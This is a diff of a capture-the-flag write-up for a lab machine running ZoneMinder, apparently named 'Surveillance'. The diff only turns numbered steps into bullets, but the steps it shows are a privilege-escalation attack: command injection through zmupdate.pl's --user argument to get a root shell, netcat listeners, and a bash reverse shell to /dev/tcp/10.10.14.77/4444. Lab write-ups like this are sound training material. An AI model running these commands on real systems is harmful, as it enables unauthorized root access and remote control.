@@ -293,7 +293,7 @@ nc -lvnp 1234
 ```
 ![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20081920.png?raw=true)
 
-1. Check for privelege on permissions
+- Check for privelege on permissions
 
 ```terminal
 sudo -l
@@ -301,20 +301,20 @@ sudo -l
 ![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20083205.png?raw=true)
 
 
-2. In /usr/bin there are scripts that are part of ZoneMinder
+- In /usr/bin there are scripts that are part of ZoneMinder
 
 ```terminal
 ls -l /usr/bin/zm*
 ```
 ![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20090551.png?raw=true)
 
-3. Try to run zmupdate.pl
+- Try to run zmupdate.pl
 
 ```terminal
 sudo zmupdate.pl --user='$(touch /tmp/test)'
 ```
 
-4. Check the file was created, with root permissions
+- Check the file was created, with root permissions
 
 ```terminal
 ls -l /tmp
@@ -323,26 +323,26 @@ ls -l /tmp
 ![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20090626.png?raw=true)
 
 
-5. Attempt to open a new shell
+- Attempt to open a new shell
 
 ```terminal
 sudo /usr/bin/zmupdate.pl --version 1 --user='$(/bin/bash)'
 ```
 ![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20090657.png?raw=true)
 
-6. Reverse shell
+- Reverse shell
 
 ```terminal
 nc -lvnp 123
 ```
 ![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/surveillance/Screenshot%202024-05-29%20090717.png?raw=true)
 
-7. Run the reverse shell from the target computer
+- Run the reverse shell from the target computer
 
 ```terminal
 bash -i >& /dev/tcp/10.10.14.77/4444 0>&1
 ```
-8. Whoami?
+- Whoami?
 
 
 
